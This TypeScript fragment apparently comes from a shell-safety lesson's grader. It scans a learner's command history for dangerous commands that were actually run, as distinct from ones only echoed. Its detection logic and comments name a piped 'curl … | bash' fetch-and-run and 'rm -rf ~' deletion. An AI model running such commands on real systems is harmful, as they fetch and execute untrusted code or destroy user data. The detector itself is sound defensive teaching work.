/* ── history forensics ─────────────────────────────────────────────── */

/** A flag bundle that makes rm recursive: -r, -rf, -fr, -Rf … */
const RECURSIVE = /^-[A-Za-z]*[rR]/;

/**
 * Did the learner actually *run* something from the red-flag list — as opposed
 * to rehearsing it?
 *
 * This is segment-aware on purpose. Section 11.1 step 4 teaches rehearsal by
 * `echo`-ing a command to see what its globs expand to, so
 * `echo rm -rf ~ /site/build` must stay free and safe: its command word is
 * `echo`. Only a segment whose own command word is the dangerous program
 * counts. Quotes are respected because splitSegments() respects them, so
 * `echo 'curl … | bash'` is one segment starting with echo, not two.
 */
function approvedSomethingDangerous(historyLog: readonly string[]): boolean {
	for (const line of historyLog) {
		for (const segment of splitSegments(line)) {
			const word = commandWordOf(segment);
			// A shell fed from a pipe: the tail of `curl … | bash`.
			if (word === 'bash' || word === 'sh') return true;
			if (word === 'rm') {
				const args = segment.split(/\s+/).slice(1);
				if (args.some((t) => RECURSIVE.test(t))) return true;
			}
		}
	}
	return false;
}

